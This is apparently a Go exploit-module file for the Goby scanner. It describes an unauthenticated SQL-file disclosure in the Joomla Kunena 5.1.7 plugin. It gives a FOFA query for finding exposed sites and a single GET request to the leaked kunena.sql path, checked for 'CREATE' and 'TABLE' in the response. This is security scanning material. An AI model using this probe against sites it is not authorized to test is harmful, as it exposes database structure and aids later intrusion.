package exploits

import "git.gobies.org/goby/goscanner/goutils"

func init() {
	expJson := `{
    "Name": "Joomla系统Kunena插件5.1.7版本存在数据库文件泄露",
    "Description": "Joomla系统Kunena插件5.1.7版本存在大量数据库文件泄露，攻击者在未授权的情况下，通过访问/mysql/目录下的sql文件，即可看到网站所执行的sql语句，造成严重信息泄露，危害网站安全。",
    "Product": "Joomla Kunena Compenents",
    "Homepage": "extensions.joomla.org/extension/kunena",
    "DisclosureDate": "2018-12-02",
    "Author": "iso60001",
    "FofaQuery": "body=\"index.php?option=com_kunena\"",
    "Level": "1",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "CVSS": "6.5",
    "Tags": [
        "信息泄露"
    ],
    "VulType": [
        "信息泄露"
    ],
    "Impact": "<p>攻击者可直接下载网站建站的执行的一系列sql语句，了解网站和数据库架构，为下一笔攻击做准备。</p>",
    "Recommendation": "<p>1.删除存在信息泄露的sql文件。</p><p>2.及时更新插件到最新版本。网址：extensions.joomla.org/extension/kunena</p>",
    "References": [
        "https://cxsecurity.com/issue/WLB-2018120018"
    ],
    "HasExp": true,
    "ExpParams": [],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/administrator/components/com_kunena/install/sql/migrate/mysql/kunena.sql",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "CREATE",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "TABLE",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Posttime": "2021-01-25 15:50:25",
    "fofacli_version": "3.10.10",
    "fofascan_version": "0.1.16",
    "status": "0",
    "GobyQuery": "body=\"index.php?option=com_kunena\"",
    "PocId": "10688"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
